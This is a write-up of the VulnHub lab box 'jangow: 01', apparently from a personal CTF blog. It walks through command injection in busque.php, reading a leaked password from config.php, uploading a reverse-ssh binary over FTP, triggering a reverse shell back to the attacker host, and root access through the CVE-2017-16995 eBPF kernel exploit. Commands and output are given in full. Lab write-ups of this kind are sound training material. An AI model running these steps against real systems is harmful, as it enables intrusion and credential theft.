@@ -1,0 +1,155 @@
+---
+title: "jangow: 01"
+platform: "VulnHub"
+difficulty: "Easy"
+os: "Linux"
+date: "2026-06-24"
+tags: ["linux", "ftp", "rce", "web-shell", "reverse-ssh", "kernel-exploit", "cve-2017-16995"]
+description: "VulnHub box with a PHP web shell exposed at busque.php passing user input straight to system(). Config.php leaked a password that also worked on FTP, allowing file uploads. Got a shell via reverse-ssh, escalated to root with a kernel eBPF exploit against the 4.4.0-31 kernel."
+status: "complete"
+---
+
+---
+
+## 1. Information Gathering
+
+<TerminalOutput
+  cmd="nmap -A -T5 10.0.0.221"
+  rawHref="/writeups/raw/jangow-01/nmap"
+  output={`PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+80/tcp open  http    Apache httpd 2.4.18
+
+http-ls: Volume /
+  SIZE  TIME              FILENAME
+  -     2021-06-10 18:05  site/`}
+/>
+
+Just FTP and HTTP. Apache is showing a directory listing with a `site/` folder.
+
+---
+
+## 2. Web — busque.php
+
+Browsing to `http://10.0.0.221/site/` reveals `busque.php`. Throwing it at gobuster in fuzz mode confirms it's passing whatever you give `?buscar=` straight to the shell:
+
+<TerminalOutput
+  cmd="gobuster fuzz -w /usr/share/wordlists/dirb/big.txt -u 'http://10.0.0.221/site/busque.php?buscar=FUZZ' -b 404 --exclude-length 1"
+  rawHref="/writeups/raw/jangow-01/gobuster-fuzz"
+  output={`[Status=200] [Length=55]  busque.php?buscar=id
+[Status=200] [Length=10]  busque.php?buscar=whoami
+[Status=200] [Length=20]  busque.php?buscar=pwd
+[Status=200] [Length=58]  busque.php?buscar=ls`}
+/>
+
+Every Linux command that makes sense returns output. The PHP is just `system($_GET['buscar'])` with no filtering — instant RCE.
+
+<TerminalOutput
+  cmd="curl 'http://10.0.0.221/site/busque.php?buscar=id'"
+  output={`uid=33(www-data) gid=33(www-data) groups=33(www-data)`}
+/>
+
+Reading the site config:
+
+<TerminalOutput
+  cmd="curl 'http://10.0.0.221/site/busque.php?buscar=cat+/var/www/html/site/wordpress/config.php'"
+  output={`$servername = "localhost";
+$database   = "desafio02";
+$username   = "desafio02";
+$password   = "abygurl69";`}
+/>
+
+Password `abygurl69`. Try it on FTP as `jangow01` — it works. The same password also works for `su jangow01` once we have a shell.
+
+---
+
+## 3. FTP — Upload Payload
+
+FTP is running as `jangow01` and can write to their home directory. Upload `reverse-sshx64` (a compiled reverse-ssh binary with password `hacked`) and the kernel exploit:
+
+<TerminalOutput
+  cmd="ftp jangow01@10.0.0.221"
+  rawHref="/writeups/raw/jangow-01/ftp-upload"
+  output={`230 Login successful.
+
+ftp> cd /home/jangow01
+ftp> put reverse-sshx64 reverse-sshx64
+226 Transfer complete.
+
+ftp> chmod 777 reverse-sshx64
+200 SITE CHMOD command ok.
+
+ftp> cd /tmp
+ftp> put 45010.c 45010.c
+226 Transfer complete.`}
+/>
+
+---
+
+## 4. Reverse Shell via reverse-ssh
+
+[reverse-ssh](https://github.com/Fahrj/reverse-ssh) creates an SSH tunnel in reverse — the target connects out to us, and we SSH back through the tunnel. This bypasses blocked inbound connections.
+
+Start the listener on Kali:
+
+<TerminalOutput
+  cmd="./reverse-sshx64 -v -l -p 2222"
+  output={`Listening on :2222...`}
+/>
+
+Trigger the binary on the target via the RCE endpoint:
+
+<TerminalOutput
+  cmd="curl 'http://10.0.0.221/site/busque.php?buscar=/home/jangow01/reverse-sshx64+-v+-p+2222+10.0.0.67+%26'"
+  output={``}
+/>
+
+The listener catches the connection and opens a local SSH port on 8888. Connect through:
+
+<TerminalOutput
+  cmd="ssh www-data@127.0.0.1 -p 8888"
+  output={`www-data@127.0.0.1's password: hacked
+www-data@jangow01:~/html/site$`}
+/>
+
+Switch to jangow01 with the password from config.php:
+
+<TerminalOutput
+  cmd="su jangow01"
+  output={`Password: abygurl69
+jangow01@jangow01:/var/www/html/site$`}
+/>
+
+<Note type="flag">
+  **user.txt** found at `/home/jangow01/user.txt`
+</Note>
+
+---
+
+## 5. Privilege Escalation — CVE-2017-16995
+
+<TerminalOutput
+  cmd="uname -r"
+  output={`4.4.0-31-generic`}
+/>
+
+Kernel `4.4.0-31` is vulnerable to CVE-2017-16995 — an eBPF verifier type confusion bug that lets unprivileged users patch their own kernel credentials. The exploit is ExploitDB 45010.
+
+Compile and run from `/tmp` where we uploaded it via FTP:
+
+<TerminalOutput
+  cmd="gcc /tmp/45010.c -o /tmp/45010 && /tmp/45010"
+  rawHref="/writeups/raw/jangow-01/kernel-exploit"
+  output={`[*] creating bpf map
+[*] sneaking evil bpf past the verifier
+[*] Cred structure at ffff8800372c6a80
+[*] UID from cred structure: 1000, matches the current: 1000
+[*] hammering cred structure at ffff8800372c6a80
+[*] credentials patched, launching shell...
+# whoami
+root`}
+/>
+
+<Note type="flag">
+  **proof.txt** — `da39a3ee5e6b4b0d3255bfef95601890afd80709`
+</Note>
